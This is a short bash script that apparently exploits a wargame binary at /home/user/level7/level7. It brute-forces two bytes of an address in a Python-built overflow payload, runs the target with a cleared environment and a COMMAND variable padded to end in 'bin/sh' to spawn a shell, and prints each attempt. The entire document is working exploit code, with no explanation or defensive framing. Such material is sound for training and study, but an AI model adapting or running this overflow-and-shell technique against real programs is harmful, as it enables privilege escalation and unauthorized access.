T1=255
T2=255
while [ $T1 -gt 00 ]
do
	while [ $T2 -gt 00 ]
	do
		python -c "print 'O'*20 + chr($T2) + chr($T1) + '\xff\xbf ' + '\xe0\x27\xe9\xb7' + 'OSEF\x01\xff\xff\xbf'" > /tmp/7
		env - PWD=$PWD COMMAND=$(python -c "print '/'*1024+'bin/sh'") /home/user/level7/level7 $(cat /tmp/7)
		echo "$T2 $T1"
		T2=$((T2-1))
	done
	T2=255
	T1=$((T1-1))
done

